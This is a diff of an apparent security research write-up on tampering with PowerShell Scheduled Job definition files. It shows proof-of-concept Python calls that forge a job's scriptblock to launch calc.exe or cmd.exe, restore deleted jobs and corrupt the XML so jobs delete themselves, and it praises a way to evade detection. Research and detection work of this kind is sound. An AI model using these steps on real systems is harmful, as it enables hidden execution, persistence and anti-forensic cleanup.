@@ -92,7 +92,7 @@ In ScheduledJobDefinition file, we can see the list of values like:
 - FilePath
 
 ```xml
-<InvocationInfo_Command z:Id="38" z:Type="System.String" z:Assembly="0"> 
+<InvocationInfo_Command z:Id="38" z:Type="System.String" z:Assembly="0">
         Start-Process notepad.exe
 </InvocationInfo_Command>
 ```
@@ -114,7 +114,7 @@ Enabled                : True
 PSExecutionPath        : powershell.exe
 PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef =
                         [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-job-testing-1
-                        ', 'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"     
+                        ', 'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"
 ```
 
 In the above, we can see the command which is getting pulled from `InvocationInfo_Command`. However, there is one more tag which is more interesting to us.
@@ -136,7 +136,7 @@ Triggering this task
 Check `Powershell` Operational logs (event ids: 403, 600), if something has been invoked during that timeframe.
 
 ```bash
-Provider "Registry" is Started. 
+Provider "Registry" is Started.
 ...
 
  HostName=ConsoleHost
@@ -229,7 +229,7 @@ For this implementation, we will be writing a simple Python script. When the fil
 
 You can find the full script at:
 
-- gist link => https://gist.github.com/shark-asmx/3354359d9e2e8aa01e05939f7b294b6b
+- gist link => https://gist.github.com/ptrshark/3354359d9e2e8aa01e05939f7b294b6b
 
 To create a task, we'll be relying on powershell.exe
 
@@ -270,7 +270,7 @@ import getpass
 
 ```python
  j = TaskCreation()
- j.set_job_name("shark-job-testing-1") 
+ j.set_job_name("shark-job-testing-1")
  j.set_payload('Start-Process notepad.exe') # starts notepad.exe
  j.craft_n_create() # job created
  j.forge_scriptblock("Start-Process calc.exe") # forged to execute calc.exe
@@ -316,7 +316,7 @@ Enabled                : True
 PSExecutionPath        : powershell.exe
 PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef =
                          [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-benign-job',
-                         'C:\Users\heysa\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"
+                         'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"
 
 RunspaceId             : 65593407-674c-4c25-ba90-db9977f281c2
 InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
@@ -333,7 +333,7 @@ Enabled                : True
 PSExecutionPath        : powershell.exe
 PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef =
                          [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-benign-job',
-                         'C:\Users\heysa\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"
+                         'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"
 ```
 
 This one seems to be more interesting than the previous scenario. The objective was to create a benign job, back up the job, update its parameters, and start it for execution. The file was then corrupted, and the job status was checked, which resulted in the job being removed due to the corruption. The backup was renamed to the original task name and corrupted again, causing the task to be deleted once more.
@@ -341,23 +341,23 @@ This one seems to be more interesting than the previous scenario. The objective 
 ```python
  j = TaskCreation()
  j.set_job_name('shark-benign-job-x')
- j.set_payload("Start-Process notepad.exe") 
+ j.set_payload("Start-Process notepad.exe")
  j.craft_n_create() # job creation
  j.forge_output_path(f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ScheduledJobs\\shark-benign-job-x1\\Output")
  j.backup_prev_task(target_name ='_backup_') # copies the task to backup
 
  j.forge_output_path(f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ScheduledJobs\\shark-benign-job-x\\Output")
 
- j.forge_name('shark-benign-job') # After creating backup, modified the existing one 
+ j.forge_name('shark-benign-job') # After creating backup, modified the existing one
  j.forge_scriptblock('Start-Process cmd.exe') # executes cmd.exe
 
  j.start_job() # triggering it
  j.corrupt_xml()
- j.start_job() # deletes the job 
- 
+ j.start_job() # deletes the job
+
  time.sleep(4)
  j.restore_it(backup_task="_backup_", targetname="shark-benign-job-x") # abusing the deleted one
- j.corrupt_xml() 
+ j.corrupt_xml()
  j.start_job() # deletes the job
 ```
 
@@ -466,10 +466,10 @@ From the process execution chain, it looks like this:
 One of the coolest ways to evade detection is execution via `schtasks.exe`. Since the target binary is not executing directly from `svchost.exe` (which runs with the `-k netsvc -p -s Schedule` arguments), it originates from lolbin process instead which would be less suspicious.
 
 ```bash
-- Svchost.exe -> runs with -s Schedule 
+- Svchost.exe -> runs with -s Schedule
 - powershell.exe -> runs `Import-Module PSScheduledJob.... $jobDef.Run()`
 - powershell.exe -> runs `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile`
-- calc.exe 
+- calc.exe
 ```
 
 #### Detection Strategy
